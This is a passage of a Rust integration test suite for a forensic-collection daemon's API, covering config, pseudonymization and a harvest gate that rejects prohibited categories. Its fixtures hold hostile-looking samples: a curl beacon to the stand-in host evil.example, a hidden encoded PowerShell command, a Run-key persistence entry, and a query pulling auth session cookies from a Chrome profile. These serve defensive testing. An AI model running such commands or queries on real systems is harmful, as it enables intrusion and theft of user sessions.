//! End-to-End Integration Suite for Artemis DFIR Daemon Endpoints and Marketplace Harvest Pipeline.
//!
//! Verifies:
//! - `GET /api/v1/artemis/status`: returns default disabled status, category allowlists, and airgap enforcement.
//! - `GET` & `POST` / `PUT /api/v1/artemis/config`: updates and persists configuration.
//! - `POST /api/v1/artemis/preview-normalizer`: keyed BLAKE3 structural pseudonymization.
//! - `POST /api/v1/artemis/collect`: 403 Forbidden when live collection disabled; successful ingestion from `.jsonl`.
//! - `POST /api/v1/marketplace/harvest`: rejects candidates from prohibited categories (BrowserCookies, CredentialStore) via ArtifactCategoryGate.

use axum::body::Body;
use axum::http::{Request, StatusCode};
use quorum_coordinator::dlp_mesh::global_mesh_dlp_controller;
use quorum_coordinator::SynthesisModelFamily;
use quorum_daemon::{build_router, DaemonState};
use std::io::Write;
use std::sync::Arc;
use std::time::Instant;
use tempfile::{tempdir, TempDir};
use tower::ServiceExt;

static ARTEMIS_TEST_MUTEX: std::sync::OnceLock<tokio::sync::Mutex<()>> = std::sync::OnceLock::new();

struct TestEnv {
    temp_dir: TempDir,
    _guard: tokio::sync::MutexGuard<'static, ()>,
}

impl TestEnv {
    fn path(&self) -> &std::path::Path {
        self.temp_dir.path()
    }
}

async fn setup_artemis_test_app() -> (axum::Router, Arc<DaemonState>, TestEnv) {
    let guard = ARTEMIS_TEST_MUTEX
        .get_or_init(|| tokio::sync::Mutex::new(()))
        .lock()
        .await;
    let temp_dir = tempdir().expect("tempdir");
    let data_dir = temp_dir.path().to_path_buf();

    let controller = global_mesh_dlp_controller();
    controller.init_persistence(&data_dir);
    let mut current = controller.get_settings();
    current.artemis = quorum_coordinator::artemis_airgap::ArtemisDfirSettings::default();
    controller.update_settings(current);

    let storage_config = quorum_storage::StorageConfig::new(data_dir.clone());
    let storage = Arc::new(
        quorum_storage::StorageEngine::open(storage_config)
            .await
            .expect("storage open"),
    );
    let classifier = Arc::new(quorum_classifier::FileTypeClassifier::new());
    let embedder: Arc<dyn quorum_contract::EmbeddingGenerator> =
        Arc::new(quorum_contract::DeterministicOfflineEngine::new());
    let dedup = Arc::new(quorum_ingest::TwoLevelDedupEngine::new());
    let ingest_config = quorum_ingest::IngestConfig::default();

    let reindex_worker = Arc::new(quorum_ingest::ReindexWorker::new(
        ingest_config.clone(),
        Arc::clone(&storage),
        Arc::clone(&classifier),
        Arc::clone(&embedder),
        Arc::clone(&dedup),
    ));

    let drift_healer = Arc::new(quorum_ingest::DriftHealer::new(
        ingest_config.clone(),
        Arc::clone(&storage),
        Arc::clone(&classifier),
        Arc::clone(&embedder),
        Arc::clone(&dedup),
    ));

    let node_seed = [0x5Au8; 32];
    let coordinator_engine = Arc::new(quorum_coordinator::ScatterGatherEngine::new(
        Arc::clone(&storage) as Arc<dyn quorum_coordinator::StorageSearcher>,
        Arc::new(quorum_coordinator::LocalOnlyDispatcher),
        Arc::new(tokio::sync::RwLock::new(
            quorum_coordinator::PeerAclManager::default(),
        )),
        quorum_coordinator::CoordinatorConfig::default(),
        node_seed,
        "12D3KooWArtemisTestNode".to_string(),
    ));

    let coordinator = Arc::new(quorum_coordinator::QueryCoordinator::new(
        coordinator_engine,
        quorum_coordinator::CoordinatorConfig::default(),
    ));

    let state = Arc::new(DaemonState {
        start_time: Instant::now(),
        storage,
        coordinator,
        reindex_worker,
        drift_healer,
        classifier,
        embedder,
        dedup,
        swarm_handle: None,
        ingest_config,
        default_model_family: SynthesisModelFamily::AutoFusion,
        port: 3040,
        host: "127.0.0.1".to_string(),
        data_dir,
        shutdown_notify: Arc::new(tokio::sync::Notify::new()),
        in_flight_queries: Arc::new(quorum_daemon::InFlightQueryRegistry::new()),
        sessions: quorum_daemon::ChatSessionRegistry::new(),
    });

    let router = build_router(Arc::clone(&state));
    (
        router,
        state,
        TestEnv {
            temp_dir,
            _guard: guard,
        },
    )
}

async fn read_body_json(resp: axum::response::Response) -> serde_json::Value {
    let bytes = axum::body::to_bytes(resp.into_body(), 4 * 1024 * 1024)
        .await
        .expect("read body bytes");
    serde_json::from_slice(&bytes).expect("valid json response")
}

#[tokio::test]
async fn test_artemis_status_endpoint_defaults() {
    let (app, _state, _temp_dir) = setup_artemis_test_app().await;

    // Reset settings to default
    let controller = global_mesh_dlp_controller();
    let mut current = controller.get_settings();
    current.artemis = quorum_coordinator::artemis_airgap::ArtemisDfirSettings::default();
    controller.update_settings(current);

    let res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("GET")
                .uri("/api/v1/artemis/status")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::OK);
    let json = read_body_json(res).await;

    assert_eq!(json["status"], "ok");
    assert_eq!(json["collection_enabled"], false);
    assert_eq!(json["marketplace_harvest_enabled"], false);
    assert_eq!(json["airgap_enforced"], true);
    assert_eq!(json["retention_days"], 30);
    assert_eq!(json["redact_secrets"], true);
    assert_eq!(json["normalize_for_harvest"], true);

    let allowed = json["allowed_artifact_categories"].as_array().expect("allowed array");
    assert!(allowed.iter().any(|v| v == "process_execution"));
    assert!(allowed.iter().any(|v| v == "system_event_log"));

    let prohibited = json["prohibited_artifact_categories"].as_array().expect("prohibited array");
    assert!(prohibited.iter().any(|v| v == "browser_cookies"));
    assert!(prohibited.iter().any(|v| v == "credential_store"));
}

#[tokio::test]
async fn test_artemis_config_get_and_update() {
    let (app, _state, _temp_dir) = setup_artemis_test_app().await;

    // GET config
    let get_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("GET")
                .uri("/api/v1/artemis/config")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(get_res.status(), StatusCode::OK);
    let get_json = read_body_json(get_res).await;
    assert_eq!(get_json["local_collection_enabled"], false);

    // POST config update
    let update_payload = serde_json::json!({
        "local_collection_enabled": true,
        "retention_days": 45,
        "auto_collection_interval_mins": 30,
        "normalize_for_harvest": true,
    });

    let post_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/config")
                .header("content-type", "application/json")
                .body(Body::from(update_payload.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(post_res.status(), StatusCode::OK);
    let post_json = read_body_json(post_res).await;
    assert_eq!(post_json["local_collection_enabled"], true);
    assert_eq!(post_json["retention_days"], 45);
    assert_eq!(post_json["auto_collection_interval_mins"], 30);

    // Verify subsequent GET reflects persisted changes
    let get2_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("GET")
                .uri("/api/v1/artemis/config")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(get2_res.status(), StatusCode::OK);
    let get2_json = read_body_json(get2_res).await;
    assert_eq!(get2_json["local_collection_enabled"], true);
    assert_eq!(get2_json["retention_days"], 45);
}

#[tokio::test]
async fn test_artemis_preview_normalizer() {
    let (app, _state, _temp_dir) = setup_artemis_test_app().await;

    let sample_forensic = "User S-1-5-21-3623811015-3361044348-30300820-1013 on host WIN-DC01 accessed \\\\InternalFiles\\SecLogs\\data.csv from 192.168.1.105 with MAC 00:1A:2B:3C:4D:5E";

    let res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/preview-normalizer")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({
                        "sample_text": sample_forensic,
                        "session_salt": "test-salt-1234",
                    })
                    .to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::OK);
    let json = read_body_json(res).await;

    assert_eq!(json["status"], "ok");
    let preview = &json["preview"];
    let normalized = preview["normalized_text"].as_str().expect("normalized text");

    // Must not contain raw identifiers
    assert!(!normalized.contains("S-1-5-21-3623811015-3361044348-30300820-1013"));
    assert!(!normalized.contains("192.168.1.105"));
    assert!(!normalized.contains("\\\\InternalFiles\\SecLogs"));
    assert!(!normalized.contains("00:1A:2B:3C:4D:5E"));

    // Must contain pseudonyms
    assert!(normalized.contains("SID_"));
    assert!(normalized.contains("IP_"));
    assert!(normalized.contains("SHARE_"));
    assert!(normalized.contains("MAC_"));

    assert!(preview["total_replacements"].as_u64().unwrap() >= 4);

    // Test missing/empty payload returns 400 Bad Request
    let bad_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/preview-normalizer")
                .header("content-type", "application/json")
                .body(Body::from(serde_json::json!({}).to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(bad_res.status(), StatusCode::BAD_REQUEST);
}

#[tokio::test]
async fn test_artemis_collect_live_disabled_fails_closed() {
    let (app, _state, _temp_dir) = setup_artemis_test_app().await;

    // Ensure local collection is disabled
    let controller = global_mesh_dlp_controller();
    let mut current = controller.get_settings();
    current.artemis.local_collection_enabled = false;
    controller.update_settings(current);

    let res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/collect")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({ "source_type": "live" }).to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::FORBIDDEN);
    let json = read_body_json(res).await;
    assert_eq!(
        json["error"],
        "Local Artemis DFIR collection is disabled by default. Enable in Settings first."
    );
}

#[tokio::test]
async fn test_artemis_collect_from_jsonl_file() {
    let (app, _state, temp_dir) = setup_artemis_test_app().await;

    // Create a sample .jsonl file with forensic records
    let jsonl_path = temp_dir.path().join("forensic_sample.jsonl");
    {
        let mut file = std::fs::File::create(&jsonl_path).expect("create jsonl file");
        writeln!(
            file,
            r#"{{"Computer": "WIN-SRV-01", "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc AAAA", "Image": "C:\\Windows\\System32\\powershell.exe", "ProcessId": 5012, "SubjectUserName": "SecAdmin", "collected_unix_secs": 1700000000, "Channel": "Security"}}"#
        ).unwrap();
        writeln!(
            file,
            r#"{{"Computer": "WIN-SRV-01", "Key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "ValueName": "UpdaterService", "ValueData": "C:\\ProgramData\\updater.exe", "collected_unix_secs": 1700000001}}"#
        ).unwrap();
    }

    let collect_payload = serde_json::json!({
        "source_type": "file",
        "target_path": jsonl_path.to_string_lossy().to_string(),
    });

    let res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/collect")
                .header("content-type", "application/json")
                .body(Body::from(collect_payload.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::OK);
    let json = read_body_json(res).await;

    assert_eq!(json["status"], "completed");
    assert_eq!(json["records_parsed"], 2);
    assert_eq!(json["chunks_indexed"], 2);
    assert!(json["elapsed_ms"].as_u64().is_some());
}

#[tokio::test]
async fn test_artemis_collect_inline_jsonl() {
    let (app, _state, _temp_dir) = setup_artemis_test_app().await;

    let inline_jsonl = r#"{"Computer": "LINUX-HOST", "cmdline": "/usr/bin/curl -s https://evil.example/beacon", "pid": 1234, "user": "www-data", "timestamp": 1700000050}"#;

    let res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/collect")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({
                        "source_type": "file",
                        "target_path": inline_jsonl,
                    })
                    .to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::OK);
    let json = read_body_json(res).await;
    assert_eq!(json["status"], "completed");
    assert_eq!(json["records_parsed"], 1);
    assert_eq!(json["chunks_indexed"], 1);
}

#[tokio::test]
async fn test_marketplace_harvest_prohibited_category_rejected() {
    let (app, _state, _temp_dir) = setup_artemis_test_app().await;

    // Enable marketplace opt-in
    let opt_in = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/marketplace/opt-in")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({ "opt_in_enabled": true }).to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(opt_in.status(), StatusCode::OK);

    // Send a harvest request with a prohibited category candidate (BrowserCookies)
    let prohibited_candidate = serde_json::json!({
        "record_id": "cand_prohibited_01",
        "domain_tags": ["browser_cookies", "forensics"],
        "prompt": "Extract session cookies from Google Chrome database profile",
        "rlm_trajectory": [
            {
                "step_index": 0,
                "action_kind": "tool_query",
                "sanitized_query_or_pattern": "SELECT * FROM cookies WHERE host_key LIKE '%.auth%'",
                "abstracted_takeaway": "Identified session token cookies"
            }
        ],
        "chosen_response": "Found session cookies for authenticating user sessions.",
        "citations": [],
        "source_file_path": "/Users/victim/Library/Application Support/Google/Chrome/Default/Cookies"
    });

    let harvest_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/marketplace/harvest")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({
                        "candidates": [prohibited_candidate]
                    })
                    .to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();

    // Since the only candidate is prohibited, sanitized_records is empty -> returns UNPROCESSABLE_ENTITY (422)
    assert_eq!(harvest_res.status(), StatusCode::UNPROCESSABLE_ENTITY);
    let json = read_body_json(harvest_res).await;

    assert_eq!(json["accepted_count"], 0);
    assert_eq!(json["rejected_count"], 1);

    let rejected = json["rejected_candidates"].as_array().expect("rejected list");
    assert_eq!(rejected.len(), 1);
    assert_eq!(rejected[0]["record_id"], "cand_prohibited_01");

    let reason = rejected[0]["reason"].as_str().unwrap();
    assert!(
        reason.contains("Category Gate") || reason.contains("prohibited"),
        "Expected Category Gate rejection reason, got: {}",
        reason
    );
}

#[tokio::test]
async fn test_marketplace_harvest_allowed_category_structural_normalized() {
    let (app, _state, _temp_dir) = setup_artemis_test_app().await;

    // Enable marketplace opt-in
    let opt_in = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/marketplace/opt-in")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({ "opt_in_enabled": true }).to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(opt_in.status(), StatusCode::OK);

    // Send an allowed defensive candidate with host, user, internal IP, SID, and SMB share
    let raw_host = "CORP-SEC-DC01";
    let raw_user = "svc_netdefense";
    let raw_sid = "S-1-5-21-3623811015-3361044348-30300820-1013";
    let raw_ip = "192.168.1.15";
    let raw_mac = "00:1A:2B:3C:4D:5E";
    let raw_smb = "\\\\Fileserver\\Share";

    let slice_evidence = format!(
        "Security audit log recorded Computer: {raw_host} process powershell.exe with PID 5120 spawned by cmd.exe PID 1040 under user User: {raw_user} with SID {raw_sid}. The process established socket communication with internal target {raw_ip} over port 445 via MAC address {raw_mac} and accessed network share {raw_smb} to stage defensive triage scripts."
    );
    let quote_evidence = format!(
        "powershell.exe with PID 5120 spawned by cmd.exe PID 1040 under user User: {raw_user} with SID {raw_sid}"
    );

    let prompt = format!(
        "Perform deep forensic triage on Computer: {raw_host} regarding anomalous process execution where cmd.exe spawned powershell.exe for user User: {raw_user} with account identifier {raw_sid}. The operator observed outbound traffic to private endpoint {raw_ip} using physical interface {raw_mac} and directory traversal across SMB location {raw_smb}. Analyze the defensive telemetry and summarize investigation findings."
    );

    let chosen_response = format!(
        "Forensic analysis of the security log on Computer: {raw_host} reveals that powershell.exe with PID 5120 spawned by cmd.exe PID 1040 under user User: {raw_user} with SID {raw_sid}. Socket telemetry connects the workstation to internal endpoint {raw_ip} on port 445 through interface {raw_mac}, mounting share {raw_smb}. The execution pattern indicates administrative script automation rather than malicious adversary persistence. Verify parent execution lineage."
    );

    let allowed_candidate = serde_json::json!({
        "record_id": "cand_allowed_dfir_01",
        "domain_tags": ["process_execution", "system_event_log"],
        "prompt": prompt,
        "rlm_trajectory": [
            {
                "step_index": 1,
                "action_kind": "inspect_evtx",
                "sanitized_query_or_pattern": format!("find EventID 4688 on Computer: {raw_host} for User: {raw_user}"),
                "abstracted_takeaway": format!("Correlated process creation event with socket bind to {raw_ip}")
            },
            {
                "step_index": 2,
                "action_kind": "verify_grounding",
                "sanitized_query_or_pattern": format!("slice_text.contains(quote) on {raw_smb}"),
                "abstracted_takeaway": "Verified 100% verbatim grounding of process telemetry and SMB path"
            }
        ],
        "chosen_response": chosen_response,
        "citations": [
            [slice_evidence, quote_evidence]
        ],
        "source_file_path": "artemis://windows/eventlog/Security.evtx"
    });

    let harvest_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/marketplace/harvest")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({
                        "candidates": [allowed_candidate]
                    })
                    .to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(harvest_res.status(), StatusCode::OK);
    let json = read_body_json(harvest_res).await;

    // Unconditional assertions: accepted_count == 1, rejected_count == 0
    assert_eq!(json["accepted_count"], 1);
    assert_eq!(json["rejected_count"], 0);

    let records = json["sanitized_records"].as_array().expect("sanitized_records");
    assert_eq!(records.len(), 1);
    let rec = &records[0];
    let prompt_out = rec["prompt"].as_str().unwrap();
    let response_out = rec["chosen_response"].as_str().unwrap();

    // Structural normalizer must have pseudonymized raw IP, SID, and SMB share
    assert!(!prompt_out.contains(raw_ip), "Raw IP must not be present in prompt");
    assert!(!prompt_out.contains(raw_sid), "Raw SID must not be present in prompt");
    assert!(!prompt_out.contains(raw_smb), "Raw SMB share must not be present in prompt");
    assert!(!response_out.contains(raw_ip), "Raw IP must not be present in response");
    assert!(!response_out.contains(raw_sid), "Raw SID must not be present in response");
    assert!(!response_out.contains(raw_smb), "Raw SMB share must not be present in response");

    // Pseudonyms must be present
    assert!(prompt_out.contains("IP_") || response_out.contains("IP_"), "IP_ pseudonym must be present");
    assert!(prompt_out.contains("SID_") || response_out.contains("SID_"), "SID_ pseudonym must be present");
    assert!(prompt_out.contains("SHARE_") || response_out.contains("SHARE_"), "SHARE_ pseudonym must be present");
}

#[tokio::test]
async fn test_artemis_collect_file_source_missing_path_returns_bad_request() {
    let (app, _state, _temp_dir) = setup_artemis_test_app().await;

    let res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/collect")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({ "source_type": "file" }).to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::BAD_REQUEST);
    let json = read_body_json(res).await;
    assert_eq!(
        json["error"],
        "Missing required target_path, folder_path, or file_path for non-live collection"
    );
}

#[tokio::test]
async fn test_artemis_config_prohibited_categories_filtered() {
    let (app, _state, _temp_dir) = setup_artemis_test_app().await;

    let update_payload = serde_json::json!({
        "allowed_artifact_categories": [
            "process_execution",
            "browser_cookies",
            "credential_store",
            "system_event_log"
        ]
    });

    let res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/config")
                .header("content-type", "application/json")
                .body(Body::from(update_payload.to_string()))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::OK);
    let json = read_body_json(res).await;
    let allowed = json["allowed_artifact_categories"]
        .as_array()
        .expect("allowed array");
    let allowed_strs: Vec<&str> = allowed.iter().filter_map(|v| v.as_str()).collect();

    assert!(allowed_strs.contains(&"process_execution"));
    assert!(allowed_strs.contains(&"system_event_log"));
    assert!(!allowed_strs.contains(&"browser_cookies"));
    assert!(!allowed_strs.contains(&"credential_store"));
}

#[tokio::test]
async fn test_artemis_collect_deep_directory_bounded() {
    let (app, _state, temp_dir) = setup_artemis_test_app().await;

    // Create a 20-level deep nested directory structure
    let mut deep_dir = temp_dir.path().to_path_buf();
    for i in 0..20 {
        deep_dir = deep_dir.join(format!("sub_{}", i));
    }
    std::fs::create_dir_all(&deep_dir).expect("create deep dirs");

    // Place a .jsonl file at level 2 (within depth 16)
    let level2_dir = temp_dir.path().join("sub_0").join("sub_1");
    let shallow_file = level2_dir.join("shallow.jsonl");
    std::fs::write(
        &shallow_file,
        r#"{"Computer": "WIN-01", "CommandLine": "powershell.exe", "ProcessId": 100, "collected_unix_secs": 1700000000}"#,
    )
    .unwrap();

    // Place a .jsonl file at level 20 (beyond depth 16)
    let deep_file = deep_dir.join("deep.jsonl");
    std::fs::write(
        &deep_file,
        r#"{"Computer": "WIN-DEEP", "CommandLine": "powershell.exe", "ProcessId": 200, "collected_unix_secs": 1700000000}"#,
    )
    .unwrap();

    let res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/collect")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({
                        "source_type": "folder",
                        "folder_path": temp_dir.path().to_string_lossy().to_string(),
                    })
                    .to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::OK);
    let json = read_body_json(res).await;
    // Shallow file is ingested (1 record); deep file is skipped due to max_depth = 16
    assert_eq!(json["records_parsed"], 1);
}

#[tokio::test]
async fn test_artemis_collect_multi_format_directory_and_live_when_enabled() {
    let (app, _state, temp_dir) = setup_artemis_test_app().await;

    let dump_dir = temp_dir.path().join("forensic_dump_multi");
    std::fs::create_dir_all(&dump_dir).unwrap();

    std::fs::write(
        dump_dir.join("events.jsonl"),
        r#"{"EventID":4688,"Channel":"Security","CommandLine":"cmd.exe /c whoami"}"#,
    )
    .unwrap();
    std::fs::write(
        dump_dir.join("POWERSHELL.EXE-ABCDEF12.pf"),
        b"SCCA_PREFETCH_SAMPLE",
    )
    .unwrap();
    std::fs::write(dump_dir.join("Security.evtx"), b"ElfFile\x00EVTX").unwrap();
    std::fs::write(
        dump_dir.join("com.corp.daemon.plist"),
        b"<plist><dict><key>Label</key><string>com.corp.daemon</string></dict></plist>",
    )
    .unwrap();
    std::fs::write(
        dump_dir.join("auditd.service"),
        "[Service]\nExecStart=/sbin/auditd -n\n",
    )
    .unwrap();

    let res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/collect")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({
                        "source_type": "folder",
                        "folder_path": dump_dir.to_string_lossy().to_string(),
                    })
                    .to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(res.status(), StatusCode::OK);
    let json = read_body_json(res).await;
    assert_eq!(json["status"], "completed");
    assert_eq!(json["records_parsed"], 5);
    assert_eq!(json["chunks_indexed"], 5);

    // Also test live OS collection when local_collection_enabled is enabled
    let controller = global_mesh_dlp_controller();
    let mut current = controller.get_settings();
    current.artemis.local_collection_enabled = true;
    controller.update_settings(current);

    let live_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/collect")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({ "source_type": "live" }).to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();

    assert_eq!(live_res.status(), StatusCode::OK);
    let live_json = read_body_json(live_res).await;
    assert_eq!(live_json["status"], "completed");
    assert!(
        live_json["records_parsed"].as_u64().unwrap_or(0) > 0,
        "Live OS forensic collection must parse real telemetry records"
    );
    assert!(
        live_json["chunks_indexed"].as_u64().unwrap_or(0) > 0,
        "Live OS forensic collection must index real telemetry chunks"
    );
}

#[tokio::test]
async fn test_pure_rust_folder_picker_and_browse_folders_endpoints() {
    let (app, _state, temp_dir) = setup_artemis_test_app().await;

    let sub_a = temp_dir.path().join("alpha_case");
    let sub_b = temp_dir.path().join("bravo_case");
    std::fs::create_dir_all(&sub_a).unwrap();
    std::fs::create_dir_all(&sub_b).unwrap();

    // 1. GET /api/fs/browse-folders?path= returns drives and quick_access in Pure Rust
    let root_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("GET")
                .uri("/api/fs/browse-folders?path=")
                .body(Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(root_res.status(), StatusCode::OK);
    let root_json = read_body_json(root_res).await;
    assert_eq!(root_json["status"], "ok");
    assert_eq!(root_json["engine"], "pure_rust_std_fs");
    assert!(root_json["drives"].is_array());
    assert!(root_json["quick_access"].is_array());

    // 2. POST /api/fs/pick-folder with target path lists subdirectories in Pure Rust without spawning OS Explorer
    let pick_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/fs/pick-folder")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({
                        "path": temp_dir.path().to_string_lossy().to_string()
                    })
                    .to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(pick_res.status(), StatusCode::OK);
    let pick_json = read_body_json(pick_res).await;
    assert_eq!(pick_json["status"], "ok");
    assert_eq!(pick_json["engine"], "pure_rust_std_fs");
    assert_eq!(pick_json["cancelled"], false);
    let dirs = pick_json["directories"].as_array().expect("directories array");
    let dir_names: Vec<&str> = dirs
        .iter()
        .filter_map(|d| d.get("name").and_then(|v| v.as_str()))
        .collect();
    assert!(dir_names.contains(&"alpha_case"));
    assert!(dir_names.contains(&"bravo_case"));

    // 3. POST /api/fs/pick-folder with create_subfolder creates and navigates into subfolder in Pure Rust
    let create_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/fs/pick-folder")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({
                        "path": temp_dir.path().to_string_lossy().to_string(),
                        "create_subfolder": "charlie_dfir_dump"
                    })
                    .to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(create_res.status(), StatusCode::OK);
    let create_json = read_body_json(create_res).await;
    assert_eq!(create_json["status"], "ok");
    let created_path = create_json["path"].as_str().unwrap_or("");
    assert!(created_path.ends_with("charlie_dfir_dump"));
    assert!(temp_dir.path().join("charlie_dfir_dump").is_dir());
}

#[tokio::test]
async fn test_marketplace_harvest_auto_includes_indexed_artemis_chunks_when_enabled() {
    let (app, _state, temp_dir) = setup_artemis_test_app().await;

    // 1. Ingest a forensic JSONL file into local Tier3Restricted storage
    let jsonl_path = temp_dir.path().join("auto_harvest_forensic.jsonl");
    std::fs::write(
        &jsonl_path,
        r#"{"Computer":"WIN-SEC-01","CommandLine":"powershell.exe -NoProfile -Command Get-Service","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessId":4120,"SubjectUserName":"SecAnalyst","collected_unix_secs":1700000100,"Channel":"Security"}"#,
    )
    .unwrap();

    let collect_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/collect")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({
                        "source_type": "file",
                        "target_path": jsonl_path.to_string_lossy().to_string(),
                    })
                    .to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(collect_res.status(), StatusCode::OK);

    // 2. Enable Marketplace Opt-In AND Artemis Training Data Harvesting (`marketplace_harvest_enabled = true`)
    let opt_in_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/marketplace/opt-in")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({ "opt_in_enabled": true }).to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(opt_in_res.status(), StatusCode::OK);

    let art_cfg_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/config")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({ "marketplace_harvest_enabled": true }).to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(art_cfg_res.status(), StatusCode::OK);

    // 3. Trigger default Marketplace harvest (`POST /api/v1/marketplace/harvest` with empty body)
    let harvest_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/marketplace/harvest")
                .header("content-type", "application/json")
                .body(Body::from(serde_json::json!({}).to_string()))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(harvest_res.status(), StatusCode::OK);
    let harvest_json = read_body_json(harvest_res).await;

    assert_eq!(harvest_json["accepted_count"], 3);
    assert_eq!(harvest_json["rejected_count"], 0);
    let records = harvest_json["sanitized_records"]
        .as_array()
        .expect("sanitized_records array");
    assert_eq!(records.len(), 3);
    assert!(
        records.iter().any(|r| {
            r["domain_tags"]
                .as_array()
                .map(|tags| tags.iter().any(|t| t == "artemis-dfir"))
                .unwrap_or(false)
        }),
        "Expected harvested batch to include an automatic artemis-dfir trajectory record when marketplace_harvest_enabled is true"
    );
}

#[tokio::test]
async fn test_artemis_retention_pruning_and_rlm_parent_document_inspection() {
    let (app, state, temp_dir) = setup_artemis_test_app().await;

    // Set retention_days = 7 in Artemis settings
    let cfg_res = app
        .clone()
        .oneshot(
            Request::builder()
                .method("POST")
                .uri("/api/v1/artemis/config")
                .header("content-type", "application/json")
                .body(Body::from(
                    serde_json::json!({ "retention_days": 7 }).to_string(),
                ))
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(cfg_res.status(), StatusCode::OK);

    // Create a .jsonl file with 1 expired record (ingested_unix_secs = 1_700_000_000)
    // and 1 fresh record (no ingested_unix_secs override -> defaults to current unix time)
    let jsonl_path = temp_dir.path().join("retention_and_rlm.jsonl");
    {
        let mut f = std::fs::File::create(&jsonl_path).expect("create jsonl");
        writeln!(
            f,
            r#"{{"record_id": "artemis:process_execution:expired-rec", "Computer": "WIN-OLD-01", "CommandLine": "cmd.exe /c echo expired", "Image": "C:\\Windows\\System32\\cmd.exe", "ProcessId": 1001, "ingested_unix_secs": 1700000000}}"#
        )
        .unwrap();
        writeln!(
            f,
